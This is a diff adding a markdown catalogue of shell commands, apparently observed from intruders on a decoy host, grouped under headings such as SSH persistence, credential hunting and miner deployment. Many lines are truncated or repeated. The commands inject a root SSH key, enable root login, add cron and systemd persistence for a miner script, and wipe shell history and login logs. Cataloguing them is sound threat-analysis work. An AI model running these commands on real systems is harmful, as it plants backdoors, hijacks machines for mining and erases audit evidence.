@@ -1,0 +1,87 @@
+## Generic recon
+- LC_ALL=C top -bn1
+- sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+- ps aux | grep astats | grep -v grep |grep -v systemd-networkd |grep -v ld-musl-x86_64 |grep -v rsyslogd | wc -l
+- cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc |
+- cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc |
+- sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+- ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+- ps aux | grep astats | grep -v grep | wc -l
+- ps aux | grep astats | grep -v grep | wc -l
+- sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+## Host profiling
+- uname -a
+- cat /proc/cpuinfo | grep processor | wc -l
+- uname -a
+- cat /proc/cpuinfo | grep processor | wc -l
+- uname -a
+- cat /proc/cpuinfo | grep processor | wc -l
+- uname -a
+- cat /proc/cpuinfo | grep processor | wc -l
+- uname -a
+- cat /proc/cpuinfo | grep processor | wc -l
+
+## SSH persistence
+- LC_ALL=C sudo -S sh -c 'mkdir -p ~root/.ssh'
+- LC_ALL=C sudo -S sh -c 'chmod 700 ~root/.ssh'
+- LC_ALL=C sudo -S sh -c 'echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwI
+- LC_ALL=C sudo -S sh -c 'sed -i '\''s/PermitRootLogin no/PermitRootLogin yes/'\'' /etc/ssh/sshd_config'
+- LC_ALL=C sudo -S sh -c 'systemctl restart sshd.service'
+- LC_ALL=C sudo -S sh -c 'pkill -HUP sshd'
+- PATH=$PATH:/usr/bin:/usr/local/bin CRON="$(crontab -l 2>/dev/null || true)" if ! echo "$CRON" | grep -F '/tmp/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1; then (
+- rm -rf .bash_history;rm -rf /var/run/utmp;rm -rf /var/run/wtmp -;rm -rf /var/log/lastlog;rm -rf /usr/adm/lastlog;rm -rf .bash_history;cd /home;rm -rf yum.log;cd /var/log/;rm -rf wt
+- CRON="$(crontab -l 2>/dev/null || true)" echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \ printf '%s\n%s\n' "@reboot /dev/shm/w.
+- sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.servi
+
+## GCS-aware discovery
+- uname -a
+- gcs:x:1000:1000::/home/gcs:/bin/bash
+- uname -a
+- gcs:x:1000:1000::/home/gcs:/bin/bash
+- uname -a
+- gcs:x:1000:1000::/home/gcs:/bin/bash
+- uname -a
+- gcs:x:1000:1000::/home/gcs:/bin/bash
+- uname -a
+- uname -a
+
+## Data / credential hunting
+- Linux gcs-shadow 6.17.0-1010-aws #10~24.04.1-Ubuntu SMP Thu Mar 19 01:45:25 UTC 2026 x86_64 GNU/Linux
+- cat /etc/passwd
+- passwd
+- Linux gcs-shadow 6.17.0-1010-aws #10~24.04.1-Ubuntu SMP Thu Mar 19 01:45:25 UTC 2026 x86_64 GNU/Linux
+- cat /etc/passwd
+- passwd
+- Linux gcs-shadow 6.17.0-1010-aws #10~24.04.1-Ubuntu SMP Thu Mar 19 01:45:25 UTC 2026 x86_64 GNU/Linux
+- cat /etc/passwd
+- passwd
+- Linux gcs-shadow 6.17.0-1010-aws #10~24.04.1-Ubuntu SMP Thu Mar 19 01:45:25 UTC 2026 x86_64 GNU/Linux
+
+## Network appliance probing
+(no example)
+
+## Miner deployment
+- PATH=$PATH:/usr/bin:/usr/local/bin CRON="$(crontab -l 2>/dev/null || true)" if ! echo "$CRON" | grep -F '/tmp/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1; then (
+- ps aux | grep astats | grep -v grep |grep -v systemd-networkd |grep -v ld-musl-x86_64 |grep -v rsyslogd | wc -l
+- sh -c "pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \"$pids\" ] && kill -9 $pids || pkill -x 'kstats' || true"
+- cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc |
+- sh -c "pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \"$pids\" ] && kill -9 $pids || pkill -x 'kstats' || true"
+- cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc |
+- CRON="$(crontab -l 2>/dev/null || true)" echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \ printf '%s\n%s\n' "@reboot /dev/shm/w.
+- sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.servi
+- ps aux | grep astats | grep -v grep | wc -l
+- cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+## File transfer / staging
+- cd "/tmp" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+- cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+- sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.servi
+- cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+- cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+- sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.servi
+- cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+- cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+- sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.servi
+- cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
